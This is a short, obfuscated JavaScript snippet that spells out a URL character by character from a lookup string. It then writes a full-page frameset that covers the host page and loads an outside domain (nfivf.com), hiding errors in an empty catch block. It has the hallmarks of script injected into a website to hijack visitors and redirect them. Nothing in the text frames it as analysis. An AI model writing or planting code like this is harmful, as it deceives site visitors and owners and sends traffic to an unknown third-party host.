try{
    browserRedirect();
    function browserRedirect(){
        var f,h,tj;
        var r = ('abcdefghijklmnopqrstuvwxyz0123456789ASDFGHJKLQWERTYUIOPZXCVBNM\\<="/:;#?&.%-_ >{}').split('');
        h = r[7]+r[19]+r[19]+r[15]+r[67]+r[66]+r[66]+r[13]+r[5]+r[8]+r[21]+r[5]+r[72]+r[2]+r[14]+r[12]+r[66];
        tj = "";
        f = [r[63]+r[5]+r[17]+r[0]+r[12]+r[4]+r[18]+r[4]+r[19]+r[76]+r[2]+r[14]+r[11]+r[18]+r[64]+r[65]+r[27]+r[26]+r[26]+r[73]+r[65]+r[76]+r[17]+r[14]+r[22]+r[18]+r[64]+r[65]+r[27]+r[26]+r[26]+r[73]+r[65]+r[77]+r[63]+r[5]+r[17]+r[0]+r[12]+r[4]+r[76]+r[18]+r[17]+r[2]+r[64]+r[65], r[65]+r[76]+r[66]+r[77]+r[63]+r[5]+r[17]+r[0]+r[12]+r[4]+r[76]+r[18]+r[17]+r[2]+r[64]+r[65], r[65]+r[76]+r[66]+r[77]+r[63]+r[66]+r[5]+r[17]+r[0]+r[12]+r[4]+r[18]+r[4]+r[19]+r[77]];
        document.writeln(f[0]+h+f[1]+tj+f[2]);
    }
}catch(err){}